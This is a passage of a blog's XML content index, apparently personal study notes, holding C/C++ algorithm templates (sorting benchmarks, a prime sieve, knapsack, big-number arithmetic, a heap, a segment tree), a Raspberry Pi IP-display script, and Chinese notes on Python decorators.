main(void)    {        clock_t start,stop;        double duration;        int num[MAX] = {0};        double t[6];        printf(&quot;将对%d个随机数进行排序\n&quot;,MAX);    //冒泡        suiji(num);        start = clock();        maopao(num,MAX);//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;冒泡排序时间：%f\n&quot;,duration);        t[0]=duration;    //插入        suiji(num);        start = clock();        charu(num,MAX);//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;插入排序时间：%f\n&quot;,duration);        t[1]=duration;    //选择        suiji(num);        start = clock();        xuanze(num,MAX);//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;选择排序时间：%f\n&quot;,duration);        t[2]=duration;    //快速        suiji(num);        start = clock();        kuaisu(num,0,MAX-1);//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;快速排序时间：%f\n&quot;,duration);        t[3]=duration;    //希尔        suiji(num);        start = clock();        xier(num,MAX,int(log(MAX+1)/log(2)));//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;希尔排序时间：%f\n&quot;,duration);        t[4]=duration;    //堆        suiji(num);        start = clock();    //    BUILD(num);        dui(num,MAX);//排序        //print(num);        stop = clock();        duration = ((double)(stop - start))/CLK_TCK;        printf(&quot;堆排序时间：%f\n&quot;,duration);        t[5]=duration;        putchar(&#39;\n&#39;);        printf(&quot;冒泡排序时间：%f\n&quot;,t[0]);        printf(&quot;插入排序时间：%f\n&quot;,t[1]);        printf(&quot;选择排序时间：%f\n&quot;,t[2]);        printf(&quot;快速排序时间：%f\n&quot;,t[3]);        printf(&quot;希尔排序时间：%f\n&quot;,t[4]);        printf(&quot;堆排序时间  ：%f\n&quot;,t[5]);        system(&quot;pause&quot;);        return 0;    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 埃拉托色尼筛选法.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E5%9F%83%E6%8B%89%E6%89%98%E8%89%B2%E5%B0%BC%E7%AD%9B%E9%80%89%E6%B3%95/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E5%9F%83%E6%8B%89%E6%89%98%E8%89%B2%E5%B0%BC%E7%AD%9B%E9%80%89%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">#include &lt;iostream&gt;using namespace std;void FilterPrime(int n){    bool* isPrimes = new bool[n+1];    for(int i=2;i&lt;=n;++i)        isPrimes[i] = true;    isPrimes[2] = true;    for(int j=2;j&lt;=n;++j)        if(isPrimes[j]==true)            for(int m=2;j*m&lt;=n;++m)                isPrimes[j*m] = false;    for(int k=2;k&lt;=n;++k)        if(isPrimes[k]==true)            cout&lt;&lt;k&lt;&lt;&quot;是素数&quot;&lt;&lt;endl;    delete [] isPrimes;}int main(){    int num;    cin&gt;&gt;num;    FilterPrime(num);    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 多重背包问题模板.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">//多重背包问题模板#include &lt;set&gt;#include &lt;map&gt;#include &lt;list&gt;#include &lt;cmath&gt;#include &lt;ctime&gt;#include &lt;deque&gt;#include &lt;queue&gt;#include &lt;stack&gt;#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;cctype&gt;#include &lt;cstring&gt;#include &lt;sstream&gt;#include &lt;fstream&gt;#include &lt;cstdlib&gt;#include &lt;cassert&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;//Constant Declaration/*--------------------------*/ //#define LL long long #define LL __int64const int M=110;const int INF=1&lt;&lt;30;const double EPS = 1e-11;const double PI = acos(-1.0);/*--------------------------*/// some essential funtion/*----------------------------------*/void Swap(int &amp;a,int &amp;b){ int t=a;a=b;b=t; }int Max(int a,int b){ return a&gt;b?a:b; }int Min(int a,int b){ return a&lt;b?a:b; }int Gcd(int a,int b){ while(b){b ^= a ^=b ^= a %= b;} return a; }/*----------------------------------*///for (i = 0; i &lt; n; i++)/*----------------------------------*/int c[M], w[M], n1[M];//c:费用 w:价值 n1:数量int f[M];//f[与V有关],c和w[与n]有关int v, V, V1;//V:容量 V1:容量2//01背包void ZeroOnePack(int c, int w){    for (int v = V; v &gt;= c; v--)    {        f[v] = Max(f[v], f[v-c] + w);    }}//完全背包void CompletePack(int c, int w){    for (int v = c; v &lt;= V; v++)    {        f[v] = Max(f[v], f[v-c] + w);    }}//多重背包，二进制。void MultiplePack(int c, int w, int n1){    if (c * n1 &gt;= V)    {        CompletePack(c, w);     }    else    {        int k = 1;        while (k &lt; n1)        {            ZeroOnePack(k*c, k*w);            n1 -= k;            k &lt;&lt;= 1;        }        ZeroOnePack(n1*c, n1*w);    }}int main(){    //freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin);    //freopen(&quot;out.txt&quot;,&quot;w&quot;,stdout);    int t, case1 = 0;    scanf(&quot;%d&quot;, &amp;t);    int n, m;//n:物品种数    int i, j;    //scanf(&quot;%d%d&quot;, &amp;n, &amp;m);    while (t--)    {        scanf(&quot;%d%d&quot;, &amp;V, &amp;n);        for (i = 1; i &lt;= n; i++)        {            scanf(&quot;%d%d%d&quot;, &amp;c[i], &amp;w[i], &amp;n1[i]);        }        memset(f, 0, sizeof(f));        for (i = 1; i &lt;= n; i++)        {            MultiplePack(c[i], w[i], n1[i]);         }        printf(&quot;%d\n&quot;, f[V]);    }    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 大数运算模板.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E5%A4%A7%E6%95%B0%E8%BF%90%E7%AE%97%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E5%A4%A7%E6%95%B0%E8%BF%90%E7%AE%97%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std; #define MAXN 9999#define MAXSIZE 10#define DLEN 4class BigNum{ private:     int a[101];    //可以控制大数的位数     int len;       //大数长度public:     BigNum(){ len = 1;memset(a,0,sizeof(a)); }   //构造函数    BigNum(const int);       //将一个int类型的变量转化为大数    BigNum(const char*);     //将一个字符串类型的变量转化为大数    BigNum(const BigNum &amp;);  //拷贝构造函数    BigNum &amp;operator=(const BigNum &amp;);   //重载赋值运算符，大数之间进行赋值运算    friend istream&amp; operator&gt;&gt;(istream&amp;,  BigNum&amp;);   //重载输入运算符    friend ostream&amp; operator&lt;&lt;(ostream&amp;,  BigNum&amp;);   //重载输出运算符    BigNum operator+(const BigNum &amp;) const;   //重载加法运算符，两个大数之间的相加运算     BigNum operator-(const BigNum &amp;) const;   //重载减法运算符，两个大数之间的相减运算     BigNum operator*(const BigNum &amp;) const;   //重载乘法运算符，两个大数之间的相乘运算     BigNum operator/(const int   &amp;) const;    //重载除法运算符，大数对一个整数进行相除运算    BigNum operator^(const int  &amp;) const;    //大数的n次方运算    int    operator%(const int  &amp;) const;    //大数对一个int类型的变量进行取模运算        bool   operator&gt;(const BigNum &amp; T)const;   //大数和另一个大数的大小比较    bool   operator&lt;(const BigNum &amp; T) const;    bool   operator==(const BigNum &amp; T) const;    bool   operator&gt;(const int &amp; t)const;      //大数和一个int类型的变量的大小比较    bool   operator&lt;(const int &amp;t) const;    bool   operator==(const int &amp;t) const;     void print();       //输出大数}; bool BigNum::operator==(const BigNum &amp; T) const {    return !(*this &gt; T) &amp;&amp; !(T &gt; *this);}bool BigNum::operator==(const int &amp;t) const {    BigNum T = BigNum(t);    return *this == T;}bool BigNum::operator&lt;(const BigNum &amp; T) const {    return T &gt; *this;    }bool BigNum::operator&lt;(const int &amp;t) const {    return BigNum(t) &gt; *this;}BigNum::BigNum(const int b)     //将一个int类型的变量转化为大数{     int c,d = b;    len = 0;    memset(a,0,sizeof(a));    while(d &gt; MAXN)    {        c = d - (d / (MAXN + 1)) * (MAXN + 1);         d = d / (MAXN + 1);        a[len++] = c;    }    a[len++] = d;}BigNum::BigNum(const char*s)     //将一个字符串类型的变量转化为大数{    int t,k,index,l,i;    memset(a,0,sizeof(a));    l=strlen(s);       len=l/DLEN;    if(l%DLEN)        len++;    index=0;    for(i=l-1;i&gt;=0;i-=DLEN)    {        t=0;        k=i-DLEN+1;        if(k&lt;0)            k=0;        for(int j=k;j&lt;=i;j++)            t=t*10+s[j]-&#39;0&#39;;        a[index++]=t;    }}BigNum::BigNum(const BigNum &amp; T) : len(T.len)  //拷贝构造函数{     int i;     memset(a,0,sizeof(a));     for(i = 0 ; i &lt; len ; i++)        a[i] = T.a[i]; } BigNum &amp; BigNum::operator=(const BigNum &amp; n)   //重载赋值运算符，大数之间进行赋值运算{    int i;    len = n.len;    memset(a,0,sizeof(a));     for(i = 0 ; i &lt; len ; i++)         a[i] = n.a[i];     return *this; }istream&amp; operator&gt;&gt;(istream &amp; in,  BigNum &amp; b)   //重载输入运算符{    char ch[MAXSIZE*4];    int i = -1;    in&gt;&gt;ch;    int l=strlen(ch);    int count=0,sum=0;    for(i=l-1;i&gt;=0;)    {        sum = 0;        int t=1;        for(int j=0;j&lt;4&amp;&amp;i&gt;=0;j++,i--,t*=10)        {            sum+=(ch[i]-&#39;0&#39;)*t;        }        b.a[count]=sum;        count++;    }    b.len =count++;    return in;}ostream&amp; operator&lt;&lt;(ostream&amp; out,  BigNum&amp; b)   //重载输出运算符{    int i;      cout &lt;&lt; b.a[b.len - 1];     for(i = b.len - 2 ; i &gt;= 0 ; i--)    {         cout.width(DLEN);         cout.fill(&#39;0&#39;);         cout &lt;&lt; b.a[i];     }     return out;}BigNum BigNum::operator+(const BigNum &amp; T) const   //两个大数之间的相加运算{    BigNum t(*this);    int i,big;      //位数       big = T.len &gt; len ? T.len : len;     for(i = 0 ; i &lt; big ; i++)     {         t.a[i] +=T.a[i];         if(t.a[i] &gt; MAXN)         {             t.a[i + 1]++;             t.a[i] -=MAXN+1;         }     }     if(t.a[big] != 0)        t.len = big + 1;     else        t.len = big;       return t;}BigNum BigNum::operator-(const BigNum &amp; T) const   //两个大数之间的相减运算 {      int i,j,big;    bool flag;    BigNum t1,t2;    if(*this&gt;T)    {        t1=*this;        t2=T;        flag=0;    }    else    {        t1=T;        t2=*this;        flag=1;    }    big=t1.len;    for(i = 0 ; i &lt; big ; i++)    {        if(t1.a[i] &lt; t2.a[i])        {             j = i + 1;             while(t1.a[j] == 0)                j++;             t1.a[j--]--;             while(j &gt; i)                t1.a[j--] += MAXN;            t1.a[i] += MAXN + 1 - t2.a[i];         }         else            t1.a[i] -= t2.a[i];    }    t1.len = big;    while(t1.a[t1.len - 1] == 0 &amp;&amp; t1.len &gt; 1)    {        t1.len--;        big--;    }    if(flag)        t1.a[big-1]=0-t1.a[big-1];    return t1; } BigNum BigNum::operator*(const BigNum &amp; T) const   //两个大数之间的相乘运算 {     BigNum ret;     int i,j,up;     int temp,temp1;       for(i = 0 ; i &lt; len ; i++)    {         up = 0;         for(j = 0 ; j &lt; T.len ; j++)        {             temp = a[i] * T.a[j] + ret.a[i + j] + up;             if(temp &gt; MAXN)            {                 temp1 = temp - temp / (MAXN + 1) * (MAXN + 1);                 up = temp / (MAXN + 1);                 ret.a[i + j] = temp1;             }             else            {                 up = 0;                 ret.a[i + j] = temp;             }         }         if(up != 0)             ret.a[i + j] = up;     }     ret.len = i + j;     while(ret.a[ret.len - 1] == 0 &amp;&amp; ret.len &gt; 1)        ret.len--;     return ret; } BigNum BigNum::operator/(const int &amp; b) const   //大数对一个整数进行相除运算{     BigNum ret;     int i,down = 0;       for(i = len - 1 ; i &gt;= 0 ; i--)    {         ret.a[i] = (a[i] + down * (MAXN + 1)) / b;        down = a[i] + down * (MAXN + 1) - ret.a[i] * b;    }     ret.len = len;     while(ret.a[ret.len - 1] == 0 &amp;&amp; ret.len &gt; 1)        ret.len--;     return ret; }int BigNum::operator %(const int &amp; b) const    //大数对一个int类型的变量进行取模运算    {    int i,d=0;    for (i = len-1; i&gt;=0; i--)    {        d = ((d * (MAXN+1))% b + a[i])% b;      }    return d;}BigNum BigNum::operator^(const int &amp; n) const    //大数的n次方运算{    BigNum t,ret(1);    int i;    if(n&lt;0)        exit(-1);    if(n==0)        return 1;    if(n==1)        return *this;    int m=n;    while(m&gt;1)    {        t=*this;        for( i=1;i&lt;&lt;1&lt;=m;i&lt;&lt;=1)        {            t=t*t;        }        m-=i;        ret=ret*t;        if(m==1)            ret=ret*(*this);    }    return ret;}bool BigNum::operator&gt;(const BigNum &amp; T) const   //大数和另一个大数的大小比较{     int ln;     if(len &gt; T.len)        return true;     else if(len == T.len)    {         ln = len - 1;         while(a[ln] == T.a[ln] &amp;&amp; ln &gt;= 0)            ln--;         if(ln &gt;= 0 &amp;&amp; a[ln] &gt; T.a[ln])            return true;         else            return false;     }     else        return false; }bool BigNum::operator &gt;(const int &amp; t) const    //大数和一个int类型的变量的大小比较{    BigNum b(t);    return *this&gt;b;}void BigNum::print()    //输出大数{     int i;      printf(&quot;%d&quot;, a[len-1]);    for (int i = len-2; i &gt;= 0; --i) {        printf(&quot;%04d&quot;, a[i]);    }    puts(&quot;&quot;);}int main(void){    BigNum x;    while(1)    {         cin&gt;&gt;x;        if (x==0)        {            break;        }        if ((x/10-x%10*5)%17==0)        {            cout&lt;&lt;1&lt;&lt;endl;        }        else            cout&lt;&lt;0&lt;&lt;endl;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 完全背包问题模板.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">//完全背包问题模板#include &lt;iostream&gt;  using namespace std;  #define  V 1500  unsigned int f[V];//全局变量，自动初始化为0  unsigned int weight[10];  unsigned int value[10];  #define  max(x,y)   (x)&gt;(y)?(x):(y)  int main()  {      int N,M;      cin&gt;&gt;N;//物品个数      cin&gt;&gt;M;//背包容量      for (int i=1;i&lt;=N; i++)      {          cin&gt;&gt;weight[i]&gt;&gt;value[i];      }      for (int i=1; i&lt;=N; i++)          for (int j=1; j&lt;=M; j++)          {              if (weight[i]&lt;=j)              {                  f[j]=max(f[j],f[j-weight[i]]+value[i]);              }                     }      cout&lt;&lt;f[M]&lt;&lt;endl;//输出最优解  }  </code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 最大堆.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E6%9C%80%E5%A4%A7%E5%A0%86/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E6%9C%80%E5%A4%A7%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<h2 id="最大堆"><a href="#最大堆" class="headerlink" title="最大堆"></a>最大堆</h2><pre><code class="c">    //最大堆的建立    //方法1：将N个元素一个个相继插入到一个初始为空的堆去    //方法2：将N个元素按输入顺序存入，再进行调整（利用删除的策略）    //  方法2自己写一个    typedef struct HeapStruct *MaxHeap;    struct HeapStruct {        ElementType *Elements;        int Size;        int Capacity;    };    //最大堆的创建    MaxHeap Create (int MaxSize)    {        MaxSize H = malloc(sizeof(struct HeapStruct));        H-&gt;Elements = malloc((MaxSize+1) * sizeof(ElementType));        H-&gt;Size = 0;        H-&gt;Capacity = MaxSize;        H-&gt;Elements[0] = MaxData;//定义哨兵，为大于堆中所有可能值        return H;    }    //最大堆的插入    void Insert (MaxHeap H,ElementType item)    {        int i;        if(IsFull(H)){            printf(&quot;最大堆已满&quot;);            return;        }        i = ++H-&gt;Size;        for(;H-&gt;Elements[i/2]&lt;item;i/=2){            H-&gt;Elements[i]=H-&gt;Elements[i/2];        }        H-&gt;Elements[i] = item;    }    //最大堆的删除    ElementType DeleteMax (MaxHeap H)    {        int Parent,Child;        ElementType Maxitem,temp;        if(IsEmpty(H)){            printf(&quot;最大堆已空&quot;);            return;        }        Maxitem = H-&gt;Elements[1];        temp = H-&gt;Elements[H-&gt;Size--];        for(Parent=1;Parent*2&lt;=H-&gt;Size;Parent=Child){            Child = Parent * 2;            if(Child!=H-&gt;Size)&amp;&amp;(H-&gt;Elements[Child]&lt;H-&gt;Elements[Child+1])                Child++;            if(temp &gt;= H-&gt;Elements[Child])                break;            else                H-&gt;Elements[Parent] = H-Elements[Child];        }        H-&gt;Elements[Parent] = temp;        return Maxitem;    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 线段树参考模板.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%8F%82%E8%80%83%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%8F%82%E8%80%83%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;limits.h&gt;#include &lt;algorithm&gt;using namespace std;const int INFINITE = INT_MAX;const int MAXNUM = 30;int a[13]={4,7,5,2,2, 5, 1, 4, 9, 3,8,6,1};int b[13]={4,7,5,2,12, 15, 11, 14, 19, 13,18,6,1};struct SegTreeNode{    int val;    int addMark;//延迟标记}segTree[MAXNUM];//定义线段树/*功能：构建线段树root：当前线段树的根节点下标arr: 用来构造线段树的数组istart：数组的起始位置iend：数组的结束位置*/void build(int root, int arr[], int istart, int iend){    segTree[root].addMark = 0;//----设置标延迟记域    if(istart == iend)//叶子节点        segTree[root].val = arr[istart];    else    {        int mid = (istart + iend) / 2;        build(root*2+1, arr, istart, mid);//递归构造左子树        build(root*2+2, arr, mid+1, iend);//递归构造右子树        //根据左右子树根节点的值，更新当前根节点的值        segTree[root].val = min(segTree[root*2+1].val, segTree[root*2+2].val);    }}/*功能：当前节点的标志域向孩子节点传递root: 当前线段树的根节点下标*/void pushDown(int root){    if(segTree[root].addMark != 0)    {        //设置左右孩子节点的标志域，因为孩子节点可能被多次延迟标记又没有向下传递        //所以是 “+=”        segTree[root*2+1].addMark += segTree[root].addMark;        segTree[root*2+2].addMark += segTree[root].addMark;        //根据标志域设置孩子节点的值。因为我们是求区间最小值，因此当区间内每个元        //素加上一个值时，区间的最小值也加上这个值        segTree[root*2+1].val += segTree[root].addMark;        segTree[root*2+2].val += segTree[root].addMark;        //传递后，当前节点标记域清空        segTree[root].addMark = 0;    }}/*功能：线段树的区间查询root：当前线段树的根节点下标[nstart, nend]: 当前节点所表示的区间[qstart, qend]: 此次查询的区间*/int query(int root, int nstart, int nend, int qstart, int qend){    //查询区间和当前节点区间没有交集    if(qstart &gt; nend || qend &lt; nstart)        return INFINITE;    //当前节点区间包含在查询区间内    if(qstart &lt;= nstart &amp;&amp; qend &gt;= nend)        return segTree[root].val;    //分别从左右子树查询，返回两者查询结果的较小值    pushDown(root); //----延迟标志域向下传递    int mid = (nstart + nend) / 2;    return min(query(root*2+1, nstart, mid, qstart, qend),               query(root*2+2, mid + 1, nend, qstart, qend));}/*功能：更新线段树中某个区间内叶子节点的值root：当前线段树的根节点下标[nstart, nend]: 当前节点所表示的区间[ustart, uend]: 待更新的区间addVal: 更新的值（原来的值加上addVal）*/void update(int root, int nstart, int nend, int ustart, int uend, int addVal){    //更新区间和当前节点区间没有交集    if(ustart &gt; nend || uend &lt; nstart)        return ;    //当前节点区间包含在更新区间内    if(segTree[root].addMark==0)    {        if(ustart &lt;= nstart &amp;&amp; uend &gt;= nend)        {            segTree[root].addMark += addVal;            segTree[root].val += addVal;        }    }    if(nstart!=nend){        pushDown(root); //延迟标记向下传递    }    else{        //到达叶节点，由于前一个递归操作已经对该节点进行了操作，所以只要初始化addMark即可        segTree[root].addMark = 0;        return;    }    //更新左右孩子节点    int mid = (nstart + nend) / 2;    update(root*2+1, nstart, mid, ustart, uend, addVal);    update(root*2+2, mid+1, nend, ustart, uend, addVal);    //根据左右子树的值回溯更新当前节点的值    segTree[root].val = min(segTree[root*2+1].val, segTree[root*2+2].val);}void p1(){    for(int i=0;i&lt;MAXNUM;i++)    {        cout&lt;&lt;&quot; &quot;&lt;&lt;i&lt;&lt;&quot;    val  &quot;&lt;&lt;segTree[i].val&lt;&lt;&quot;  addMark  &quot;&lt;&lt;segTree[i].addMark&lt;&lt;endl;    }    for(int i=0;i&lt;6;i++)        cout &lt;&lt; a[i] &lt;&lt; &quot;  &quot;;    cout&lt;&lt;endl;}void p2(){    for(int i=0;i&lt;MAXNUM;i++)    {        cout&lt;&lt;&quot; &quot;&lt;&lt;i&lt;&lt;&quot;    val &quot;&lt;&lt;segTree[i].val&lt;&lt;&quot;   addMark   &quot;&lt;&lt;segTree[i].addMark&lt;&lt;endl;    }    for(int i=0;i&lt;6;i++)        cout &lt;&lt; b[i] &lt;&lt; &quot;  &quot;;    cout&lt;&lt;endl;}int main(){    build(0,a,0,13);   // p1();    update(0,0,13,4,10,10);    printf(&quot;\n&quot;);    p1();     build(0,b,0,13);    p2();    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pi 获取ip脚本.md</title>
      <link href="/2019/12/02/deploy/raspberry/pi%20%E8%8E%B7%E5%8F%96ip%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/12/02/deploy/raspberry/pi%20%E8%8E%B7%E5%8F%96ip%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<pre><code class="bash">#!/bin/bashsleep 10sIP=`ifconfig | grep inet | sed -n &#39;4p&#39;| awk -F &#39; &#39; &#39;{print $2}&#39; | awk -F &#39;:&#39; &#39;{print $2}&#39;`echo $IP`/home/pi/init/pcd8544_rpi ${IP}`</code></pre>]]></content>
      
      
      <categories>
          
          <category> raspberry </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 装饰器.md</title>
      <link href="/2019/12/02/deploy/python/built-in/py%20%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
      <url>/2019/12/02/deploy/python/built-in/py%20%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>参考： <a href="https://blog.csdn.net/u013205877/article/details/78872278" target="_blank" rel="noopener">https://blog.csdn.net/u013205877/article/details/78872278</a></p><p>一个非常简单的示例</p><pre><code class="python">def funA(fn):    print(&#39;A&#39;)    fn() # 执行传入的fn参数    return &#39;fkit&#39;&#39;&#39;&#39;下面装饰效果相当于：funA(funB)，funB将会替换（装饰）成该语句的返回值；由于funA()函数返回fkit，因此funB就是fkit&#39;&#39;&#39;@funAdef funB():    print(&#39;B&#39;)print(funB) # fkit</code></pre><p>上面程序使用 ＠funA 修饰 funB，这意味着程序要完成两步操作：</p><ul><li>将 funB 作为 funA() 的参数，也就是上面代码中 @funA 相当于执行 funA(funB)。</li><li>将 funB 替换成上一步执行的结果，funA() 执行完成后返回 fkit，因此 funB 就不再是函数，而是被替换成一个字符串。</li></ul><blockquote><p><strong>被修饰的函数总是被替换成 ＠ 符号所引用的函数的返回值，因此被修饰的函数会变成什么，完全由于 ＠ 符号所引用的函数的返回值决定，换句话说，如果 ＠ 符号所引用的函数的返回值是函数，那么被修饰的函数在替换之后还是函数。</strong></p></blockquote><h3 id="functools-wraps定义函数装饰器"><a href="#functools-wraps定义函数装饰器" class="headerlink" title="functools.wraps定义函数装饰器"></a>functools.wraps定义函数装饰器</h3><p><a href="https://www.cnblogs.com/fcyworld/p/6239951.html" target="_blank" rel="noopener">https://www.cnblogs.com/fcyworld/p/6239951.html</a></p><blockquote><p>装饰器（decorator）是干嘛的？对于受到封装的原函数来说，装饰器能够在那个函数执行前或者执行后分别运行一些代码，使得可以再装饰器里面访问并修改原函数的参数以及返回值，以实现约束定义、调试程序、注册函数等目标。装饰器一般返回一个包装器（wrapper），而functools.wraps就是装饰包装器的装饰器。</p></blockquote><pre><code>def tracer(func):    def wrapper(*args, **kwargs):        result = func(*args, **kwargs)        print(&#39;%s(%r,%r)-&gt;%r&#39;%(func.__name__,args,kwargs,result))        return result    return wrapper@tracerdef fibonacci(n):    if n in (0,1):        return n    return (fibonacci(n-1)+fibonacci(n-2))fibonacci(3)print(fibonacci)print(&#39;help:&#39;)help(fibonacci)</code></pre><p>输出</p><pre><code>fibonacci((1,),{})-&gt;1fibonacci((0,),{})-&gt;0fibonacci((2,),{})-&gt;1fibonacci((1,),{})-&gt;1fibonacci((3,),{})-&gt;2&lt;function tracer.&lt;locals&gt;.wrapper at 0x0000024BD3A04598&gt;help:Help on function wrapper in module __main__:wrapper(*args, **kwargs)</code></pre><blockquote><p>装饰器正常工作，但是函数的名字变成装饰器中的包装器了！！！help内置函数也失效了<br>也就是说，原函数的属性失效了<br>如果想要保留原函数的属性，就可以用到functools.wraps了</p></blockquote><p>加上 @functools.wraps(func)</p><pre><code>import functoolsdef tracer(func):    @functools.wraps(func)    def wrapper(*args, **kwargs):        result = func(*args, **kwargs)        print(&#39;%s(%r,%r)-&gt;%r&#39;%(func.__name__,args,kwargs,result))        return result    return wrapper@tracerdef fibonacci(n):    if n in (0,1):        return n    return (fibonacci(n-1)+fibonacci(n-2))fibonacci(3)print(fibonacci)print(&#39;help:&#39;)help(fibonacci)</code></pre><p>输出</p><pre><code>fibonacci((1,),{})-&gt;1fibonacci((0,),{})-&gt;0fibonacci((2,),{})-&gt;1fibonacci((1,),{})-&gt;1fibonacci((3,),{})-&gt;2&lt;function fibonacci at 0x0000026227A54598&gt;help:Help on function fibonacci in module __main__:fibonacci(n)</code></pre><p>保留原函数的属性</p><h3 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h3><pre><code>class decorator(object):    def __init__(self, func):        self.func = func    def __call__(self, *args, **kwargs):        print(&#39;before............&#39;)        res = self.func(*args, **kwargs)        print(&#39;after............&#39;)        return res@decoratordef run():    print(&#39;run............&#39;)if __name__ == &quot;__main__&quot;:    run()-----------------------------------before............run............after............</code></pre><h3 id="装饰类"><a href="#装饰类" class="headerlink" title="装饰类"></a>装饰类</h3><p>参考： <a href="https://www.jianshu.com/p/dd983ecc1104" target="_blank" rel="noopener">https://www.jianshu.com/p/dd983ecc1104</a></p><h1 id="常见装饰器"><a href="#常见装饰器" class="headerlink" title="常见装饰器"></a>常见装饰器</h1><blockquote><p>@property</p></blockquote><blockquote><p>把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@birth.setter，负责把一个setter方法变成属性赋值</p></blockquote><blockquote><p>还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性  下面birth是可读写属性，而age就是一个只读属性</p></blockquote><pre><code class="python">class Student(object):    def __init__(self, birth):        self._birth = birth    @property    def birth(self):        return self._birth    @birth.setter    def birth(self, value):        self._birth = value    # 使用时 del Student().birth    @birth.deleter    def birth(self):        del self._birth    @property    def age(self):        return 2014 - self._birth</code></pre><blockquote><p>@staticmethod 和 @classmethod</p></blockquote><blockquote><p>使用@staticmethod或@classmethod，就可以不需要实例化，直接类名.方法名()来调用</p></blockquote><ul><li>@staticmethod不需要表示自身对象的self和自身类的cls参数，就跟使用函数一样。 </li><li>@classmethod也不需要self参数，但第一个参数需要是表示自身类的cls参数。</li></ul><blockquote><p>如果在@staticmethod中要调用到这个类的一些属性方法，只能直接类名.属性名或类名.方法名。<br>而@classmethod因为持有cls参数，可以来调用类的属性，类的方法，实例化对象等，避免硬编码。</p></blockquote><pre><code class="python">class A(object):      bar = 1      def foo(self):          print &#39;foo&#39;      @staticmethod      def static_foo():          print &#39;static_foo&#39;          print A.bar      @classmethod      def class_foo(cls):          print &#39;class_foo&#39;          print cls.bar          cls().foo()  A.static_foo()  A.class_foo()  </code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pi 网络.md</title>
      <link href="/2019/12/02/deploy/raspberry/pi%20%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/12/02/deploy/raspberry/pi%20%E7%BD%91%E7%BB%9C/</url>
      
